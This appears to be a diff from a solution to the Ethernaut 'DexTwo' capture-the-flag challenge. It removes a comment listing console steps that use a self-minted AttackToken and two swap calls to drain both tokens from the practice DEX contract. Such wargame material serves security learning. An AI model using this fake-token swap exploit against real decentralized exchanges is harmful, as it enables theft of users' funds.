@@ -80,26 +80,3 @@ contract AttackToken is ERC20 {
         _mint(msg.sender, 1000);
     }
 }
-
-/* Attack steps in console:
-1. Deploy AttackToken
-2. Get addresses:
-const attackTokenAddress = "ATTACK_TOKEN_ADDRESS"
-const token1Address = await contract.token1()
-const token2Address = await contract.token2()
-
-3. Create contract instance:
-const attackToken = new web3.eth.Contract(ERC20_ABI, attackTokenAddress)
-
-4. Transfer 1 attack token to DexTwo:
-await attackToken.methods.transfer(instance, 1).send({from: player})
-
-5. Approve DexTwo:
-await attackToken.methods.approve(instance, MAX_INT).send({from: player})
-
-6. Drain token1:
-await contract.methods.swap(attackTokenAddress, token1Address, 1).send({from: player})
-
-7. Drain token2:
-await contract.methods.swap(attackTokenAddress, token2Address, 1).send({from: player})
-*/
